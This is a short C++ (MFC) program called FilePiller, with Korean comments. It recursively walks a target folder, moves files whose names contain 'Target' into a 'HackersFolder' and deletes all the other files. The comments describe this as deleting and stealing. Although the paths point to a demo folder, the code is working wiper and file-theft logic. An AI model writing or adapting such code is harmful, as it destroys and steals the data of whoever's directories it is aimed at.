#include <afx.h> 

using namespace std;
void FilePiller(CString str);

void FilePiller(CString str) {
   CFileFind finder;
   CString Filename;
   BOOL bWorking = finder.FindFile(str);

   while (bWorking)
   {
      bWorking = finder.FindNextFile();
      if (!finder.IsDirectory())
      {
         Filename = finder.GetFileTitle();
         if (Filename.Find("Target") != -1) { //파일 명(확장자 제외)에 Target 포함 시
            MoveFile(finder.GetFilePath(), "C:\\FilePiller\\HackersFolder\\" + finder.GetFileName());
         }
         else { //나머지는 삭제
            DeleteFile(finder.GetFilePath());
         }

      }

      else //디렉터리 이면
      {
         if (!finder.IsDots()) {
            FilePiller(finder.GetFilePath() + "\\*.*");
            //하위 디렉터리 탐색해서 삭제, 탈취(재귀)
         }
      }

   }
   finder.Close();
}

int main()
{
   {
      CString strWildcard("C:\\FilePiller\\TargetFolder\\*.*");
      FilePiller(strWildcard);
   }
   
   return 0;
}
